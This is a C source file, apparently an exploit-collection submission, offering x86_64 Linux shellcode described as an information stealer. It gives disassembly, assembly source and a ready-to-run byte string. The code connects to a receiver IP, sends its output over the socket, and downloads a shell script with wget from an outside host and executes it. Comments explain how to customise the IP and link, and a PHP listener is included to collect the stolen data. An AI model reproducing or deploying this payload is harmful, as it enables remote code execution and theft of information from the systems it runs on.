/*
 # Title : Linux x86_64 information stealer
 # Date : 23-05-2016
 # Author : Roziul Hasan Khan Shifat
 # Tested On : Ubuntu 14.04 LTS x86_64
 # Contact : shifath12@gmail.com

*/


/*
													How does this shellcode works
												-----------------------------------
1. First it connects to the information reciver
2. then it download a sh script from http://192.168.30.129/pri.sh (server running on Kali linux)
3. duplicating stdout,stderr with socket descriptor
4. then it execute the script using sh

*/

/*

Note: the pri.sh file was in kali linux.the server was Kali linux
client was Ubuntu
it downloads the pri.sh from kali linux
and Executes it on Ubuntu
*/



/*
											Requirements of this shellcode
										--------------------------------------
1.link of pri.sh (You can Found it on http://pastebin.com/V4gudKL5 ) . this script isn't mine.I've taken it from another.I customized the script
2.reciver ip

*/


/*
											How to use this shellcode
										---------------------------------
1. Upload the pri.sh any site
2. TO download the pri.sh , U need to Customize the wget procedure (I've marked where to customized)
3. Customize the connect procedure for connect to the reciver where i marked
4. U need to know assembly to completed 1,2 instruction

*/



/*
										Reciver
										---------
To	recive the Information U may Use Netcat
If U want to view the informations on Web browser , I've a php script for U. upload it any site.


<?php

if (!($sock = socket_create(AF_INET, SOCK_STREAM, 0)))
{
$errorcode = socket_last_error();
$errormsg = socket_strerror($errorcode);

die ("Couldn't create socket: [$errorcode] $errormsg \n");}
echo "Socket created \n\n";

if ( !socket_bind($sock, "0.0.0.0" , 1532) )
{
$errorcode = socket_last_error();
$errormsg = socket_strerror($errorcode);

die ("Could not bind socket : [$errorcode] $errormsg \n");}
echo "Socket bind OK \n\n";
if (!socket_listen ($sock , 10))
{
$errorcode = socket_last_error();
$errormsg = socket_strerror($errorcode);

die ("Could not listen on socket : [$errorcode] $errormsg \n");}
echo "Socket listen OK \n\n\n";

echo "Waiting for incoming connections... \n";
//Accept incoming connection - This is a blocking call
$client = socket_accept($sock);
//display information about the client who is connected
if (socket_getpeername($client , $address , $port))
{
echo "Client $address : $port is now connected to us. \n";
}
//read data from the incoming socket
while(1)
{

$i= socket_recv($client,$buf, 1024000,MSG_WAITALL);

if($i<=0)
die("\nconnection closed by $address");
else
echo $buf."\n\n";
}
?>

if U this script , the reciver ip will be the website ip

BUT I RECOMMEND U TO USE NETCAT


*/




/*

Disassembly of section .text:

0000000000400080 <_start>:
  400080:	6a 06                	pushq  $0x6
  400082:	6a 01                	pushq  $0x1
  400084:	6a 02                	pushq  $0x2
  400086:	5f                   	pop    %rdi
  400087:	5e                   	pop    %rsi
  400088:	5a                   	pop    %rdx
  400089:	6a 29                	pushq  $0x29
  40008b:	58                   	pop    %rax
  40008c:	0f 05                	syscall
  40008e:	48 31 db             	xor    %rbx,%rbx
  400091:	48 89 c3             	mov    %rax,%rbx
  400094:	48 31 c0             	xor    %rax,%rax
  400097:	48 31 ff             	xor    %rdi,%rdi
  40009a:	b0 39                	mov    $0x39,%al
  40009c:	0f 05                	syscall
  40009e:	4d 31 c9             	xor    %r9,%r9
  4000a1:	4c 39 c8             	cmp    %r9,%rax
  4000a4:	74 18                	je     4000be <connect>
  4000a6:	6a 3c                	pushq  $0x3c
  4000a8:	58                   	pop    %rax
  4000a9:	0f 05                	syscall

00000000004000ab <retry>:
  4000ab:	48 31 f6             	xor    %rsi,%rsi
  4000ae:	48 f7 e6             	mul    %rsi
  4000b1:	56                   	push   %rsi
  4000b2:	6a 3c                	pushq  $0x3c
  4000b4:	48 89 e7             	mov    %rsp,%rdi
  4000b7:	b0 23                	mov    $0x23,%al
  4000b9:	0f 05                	syscall
  4000bb:	eb 01                	jmp    4000be <connect>
  4000bd:	c3                   	retq

00000000004000be <connect>:
  4000be:	6a 10                	pushq  $0x10
  4000c0:	5a                   	pop    %rdx
  4000c1:	53                   	push   %rbx
  4000c2:	5f                   	pop    %rdi
  4000c3:	48 31 c0             	xor    %rax,%rax
  4000c6:	50                   	push   %rax
  4000c7:	50                   	push   %rax
  4000c8:	50                   	push   %rax
  4000c9:	c6 04 24 02          	movb   $0x2,(%rsp)
  4000cd:	66 c7 44 24 02 05 fc 	movw   $0xfc05,0x2(%rsp)
  4000d4:	c7 44 24 04 c0 a8 1e 	movl   $0x811ea8c0,0x4(%rsp)
  4000db:	81
  4000dc:	48 89 e6             	mov    %rsp,%rsi
  4000df:	b0 2a                	mov    $0x2a,%al
  4000e1:	0f 05                	syscall
  4000e3:	48 31 ff             	xor    %rdi,%rdi
  4000e6:	48 39 f8             	cmp    %rdi,%rax
  4000e9:	7c c0                	jl     4000ab <retry>
  4000eb:	48 31 c0             	xor    %rax,%rax
  4000ee:	48 31 f6             	xor    %rsi,%rsi
  4000f1:	48 ff c6             	inc    %rsi
  4000f4:	48 89 df             	mov    %rbx,%rdi
  4000f7:	b0 21                	mov    $0x21,%al
  4000f9:	0f 05                	syscall
  4000fb:	48 31 c0             	xor    %rax,%rax
  4000fe:	48 ff c6             	inc    %rsi
  400101:	48 89 df             	mov    %rbx,%rdi
  400104:	b0 21                	mov    $0x21,%al
  400106:	0f 05                	syscall
  400108:	48 31 c0             	xor    %rax,%rax
  40010b:	48 83 c0 39          	add    $0x39,%rax
  40010f:	0f 05                	syscall
  400111:	48 31 ff             	xor    %rdi,%rdi
  400114:	4d 31 e4             	xor    %r12,%r12
  400117:	49 89 c4             	mov    %rax,%r12
  40011a:	48 39 f8             	cmp    %rdi,%rax
  40011d:	74 59                	je     400178 <wget>
  40011f:	4d 31 d2             	xor    %r10,%r10
  400122:	48 31 d2             	xor    %rdx,%rdx
  400125:	4c 89 d6             	mov    %r10,%rsi
  400128:	4c 89 e7             	mov    %r12,%rdi
  40012b:	48 31 c0             	xor    %rax,%rax
  40012e:	b0 3d                	mov    $0x3d,%al
  400130:	0f 05                	syscall
  400132:	48 31 c0             	xor    %rax,%rax
  400135:	48 31 d2             	xor    %rdx,%rdx
  400138:	50                   	push   %rax
  400139:	50                   	push   %rax
  40013a:	c7 04 24 2f 2f 62 69 	movl   $0x69622f2f,(%rsp)
  400141:	c7 44 24 04 6e 2f 73 	movl   $0x68732f6e,0x4(%rsp)
  400148:	68
  400149:	48 89 e7             	mov    %rsp,%rdi
  40014c:	50                   	push   %rax
  40014d:	50                   	push   %rax
  40014e:	c7 04 24 2e 70 72 69 	movl   $0x6972702e,(%rsp)
  400155:	66 c7 44 24 04 2e 73 	movw   $0x732e,0x4(%rsp)
  40015c:	c6 44 24 06 68       	movb   $0x68,0x6(%rsp)
  400161:	48 89 e6             	mov    %rsp,%rsi
  400164:	52                   	push   %rdx
  400165:	56                   	push   %rsi
  400166:	57                   	push   %rdi
  400167:	48 89 e6             	mov    %rsp,%rsi
  40016a:	48 83 c0 3b          	add    $0x3b,%rax
  40016e:	0f 05                	syscall
  400170:	41 51                	push   %r9
  400172:	5f                   	pop    %rdi
  400173:	6a 03                	pushq  $0x3
  400175:	58                   	pop    %rax
  400176:	0f 05                	syscall

0000000000400178 <wget>:
  400178:	48 31 c0             	xor    %rax,%rax
  40017b:	50                   	push   %rax
  40017c:	50                   	push   %rax
  40017d:	50                   	push   %rax
  40017e:	c7 04 24 2f 75 73 72 	movl   $0x7273752f,(%rsp)
  400185:	c7 44 24 04 2f 62 69 	movl   $0x6e69622f,0x4(%rsp)
  40018c:	6e
  40018d:	c7 44 24 08 2f 2f 77 	movl   $0x67772f2f,0x8(%rsp)
  400194:	67
  400195:	66 c7 44 24 0c 65 74 	movw   $0x7465,0xc(%rsp)
  40019c:	48 89 e7             	mov    %rsp,%rdi
  40019f:	50                   	push   %rax
  4001a0:	50                   	push   %rax
  4001a1:	50                   	push   %rax
  4001a2:	50                   	push   %rax
  4001a3:	c7 04 24 68 74 74 70 	movl   $0x70747468,(%rsp)
  4001aa:	c7 44 24 04 3a 2f 2f 	movl   $0x312f2f3a,0x4(%rsp)
  4001b1:	31
  4001b2:	c7 44 24 08 39 32 2e 	movl   $0x312e3239,0x8(%rsp)
  4001b9:	31
  4001ba:	c7 44 24 0c 36 38 2e 	movl   $0x332e3836,0xc(%rsp)
  4001c1:	33
  4001c2:	c7 44 24 10 30 2e 31 	movl   $0x32312e30,0x10(%rsp)
  4001c9:	32
  4001ca:	c7 44 24 14 39 2f 70 	movl   $0x72702f39,0x14(%rsp)
  4001d1:	72
  4001d2:	c7 44 24 18 69 2e 73 	movl   $0x68732e69,0x18(%rsp)
  4001d9:	68
  4001da:	48 89 e6             	mov    %rsp,%rsi
  4001dd:	48 31 d2             	xor    %rdx,%rdx
  4001e0:	50                   	push   %rax
  4001e1:	66 c7 04 24 2d 4f    	movw   $0x4f2d,(%rsp)
  4001e7:	48 89 e1             	mov    %rsp,%rcx
  4001ea:	50                   	push   %rax
  4001eb:	50                   	push   %rax
  4001ec:	c7 04 24 2e 70 72 69 	movl   $0x6972702e,(%rsp)
  4001f3:	66 c7 44 24 04 2e 73 	movw   $0x732e,0x4(%rsp)
  4001fa:	c6 44 24 06 68       	movb   $0x68,0x6(%rsp)
  4001ff:	49 89 e7             	mov    %rsp,%r15
  400202:	52                   	push   %rdx
  400203:	41 57                	push   %r15
  400205:	51                   	push   %rcx
  400206:	56                   	push   %rsi
  400207:	57                   	push   %rdi
  400208:	48 89 e6             	mov    %rsp,%rsi
  40020b:	b0 3b                	mov    $0x3b,%al
  40020d:	0f 05                	syscall




*/





/*


section .text
	global _start
;-----------------



_start:

;socket()
push 6
push 1
push 2

pop rdi
pop rsi
pop rdx

push 41
pop rax
syscall

;------------------

xor rbx,rbx
mov rbx,rax ;socket descriptor

;-------------
xor rax,rax
xor rdi,rdi

mov al,57
syscall

xor r9,r9

cmp rax,r9
jz connect

push byte 60
pop rax
syscall



retry:

xor rsi,rsi
mul rsi

push rsi
push byte 60 ;1 min ( change it if U want )

mov rdi,rsp

mov al,35
syscall

jmp connect
ret



connect:

;connect()
push 16
pop rdx

push rbx
pop rdi

xor rax,rax
push rax
push rax
push rax

mov [rsp],byte 2

;-----------------------------------
;customize these staetments
mov [rsp+2],word 0xfc05 ;port 1532 ( U may change it, As U wish )
mov [rsp+4],dword 0x811ea8c0 ;ip of reciver (must change it)
;--------------------------------------


mov rsi,rsp

mov al,42
syscall

xor rdi,rdi
cmp rax,rdi
jl retry




;------------dup2(sd,1)

xor rax,rax
xor rsi,rsi
inc rsi

mov rdi,rbx

mov al,33
syscall

;------------

;------------dup2(sd,2)

xor rax,rax

inc rsi

mov rdi,rbx

mov al,33
syscall

;------------
;fork()

xor rax,rax
add rax,57
syscall

xor rdi,rdi
xor r12,r12

mov r12,rax ;pid
cmp rax,rdi

jz wget

;---------------
;wait4()

xor r10,r10 ;null
xor rdx,rdx ;null
mov rsi,r10 ;status
mov rdi,r12 ;pid

xor rax,rax
mov al,61
syscall



;;
;-------------------------

;execve("//bin/sh",{"//bin/sh",".pri.sh",NULL},NULL);

xor rax,rax
xor rdx,rdx
push rax
push rax


mov [rsp],dword '//bi'
mov [rsp+4],dword 'n/sh'


mov rdi,rsp


push rax
push rax

mov [rsp],dword '.pri'
mov [rsp+4],word '.s'
mov [rsp+6],byte 'h'
mov rsi,rsp

push rdx
push rsi
push rdi

mov rsi,rsp

add rax,59
syscall
;--------
;close(fd)

push r9
pop rdi

push 3
pop rax
syscall




wget:
;execve("/usr/bin//wget",{"/usr/bin//wget","http ://1 92.1 68.3 0.12 9/pr i.sh","-O",".pri.sh",NULL},NULL)

xor rax,rax


push rax
push rax
push rax

mov [rsp],dword '/usr'
mov [rsp+4],dword '/bin'
mov [rsp+8],dword '//wg'
mov [rsp+12],word 'et'

mov rdi,rsp

push rax
push rax
push rax
push rax

;----------------------
;cusmizetd these statements for the link of pri.sh
mov [rsp],dword 'http'
mov [rsp+4],dword '://1'
mov [rsp+8],dword '92.1'
mov [rsp+12],dword '68.3'
mov [rsp+16],dword '0.12'
mov [rsp+20],dword '9/pr'
mov [rsp+24],dword 'i.sh'
;------------------------

mov rsi,rsp
xor rdx,rdx

push rax
mov [rsp],word '-O'
mov rcx,rsp

push rax
push rax

mov [rsp],dword '.pri'
mov [rsp+4],word '.s'
mov [rsp+6],byte 'h'

mov r15,rsp






push rdx
push r15
push rcx
push rsi
push rdi

mov rsi,rsp

mov al,59
syscall


*/













#include<stdio.h>
#include<string.h>



char shellcode[]="\x6a\x06\x6a\x01\x6a\x02\x5f\x5e\x5a\x6a\x29\x58\x0f\x05\x48\x31\xdb\x48\x89\xc3\x48\x31\xc0\x48\x31\xff\xb0\x39\x0f\x05\x4d\x31\xc9\x4c\x39\xc8\x74\x18\x6a\x3c\x58\x0f\x05\x48\x31\xf6\x48\xf7\xe6\x56\x6a\x3c\x48\x89\xe7\xb0\x23\x0f\x05\xeb\x01\xc3\x6a\x10\x5a\x53\x5f\x48\x31\xc0\x50\x50\x50\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x05\xfc\xc7\x44\x24\x04\xc0\xa8\x1e\x81\x48\x89\xe6\xb0\x2a\x0f\x05\x48\x31\xff\x48\x39\xf8\x7c\xc0\x48\x31\xc0\x48\x31\xf6\x48\xff\xc6\x48\x89\xdf\xb0\x21\x0f\x05\x48\x31\xc0\x48\xff\xc6\x48\x89\xdf\xb0\x21\x0f\x05\x48\x31\xc0\x48\x83\xc0\x39\x0f\x05\x48\x31\xff\x4d\x31\xe4\x49\x89\xc4\x48\x39\xf8\x74\x59\x4d\x31\xd2\x48\x31\xd2\x4c\x89\xd6\x4c\x89\xe7\x48\x31\xc0\xb0\x3d\x0f\x05\x48\x31\xc0\x48\x31\xd2\x50\x50\xc7\x04\x24\x2f\x2f\x62\x69\xc7\x44\x24\x04\x6e\x2f\x73\x68\x48\x89\xe7\x50\x50\xc7\x04\x24\x2e\x70\x72\x69\x66\xc7\x44\x24\x04\x2e\x73\xc6\x44\x24\x06\x68\x48\x89\xe6\x52\x56\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05\x41\x51\x5f\x6a\x03\x58\x0f\x05\x48\x31\xc0\x50\x50\x50\xc7\x04\x24\x2f\x75\x73\x72\xc7\x44\x24\x04\x2f\x62\x69\x6e\xc7\x44\x24\x08\x2f\x2f\x77\x67\x66\xc7\x44\x24\x0c\x65\x74\x48\x89\xe7\x50\x50\x50\x50\xc7\x04\x24\x68\x74\x74\x70\xc7\x44\x24\x04\x3a\x2f\x2f\x31\xc7\x44\x24\x08\x39\x32\x2e\x31\xc7\x44\x24\x0c\x36\x38\x2e\x33\xc7\x44\x24\x10\x30\x2e\x31\x32\xc7\x44\x24\x14\x39\x2f\x70\x72\xc7\x44\x24\x18\x69\x2e\x73\x68\x48\x89\xe6\x48\x31\xd2\x50\x66\xc7\x04\x24\x2d\x4f\x48\x89\xe1\x50\x50\xc7\x04\x24\x2e\x70\x72\x69\x66\xc7\x44\x24\x04\x2e\x73\xc6\x44\x24\x06\x68\x49\x89\xe7\x52\x41\x57\x51\x56\x57\x48\x89\xe6\xb0\x3b\x0f\x05";       /* insert shellcode here */


int main()
{
printf("shellcode length %ld",( unsigned long ) strlen(shellcode));

( * (int(*)()) shellcode) ();

}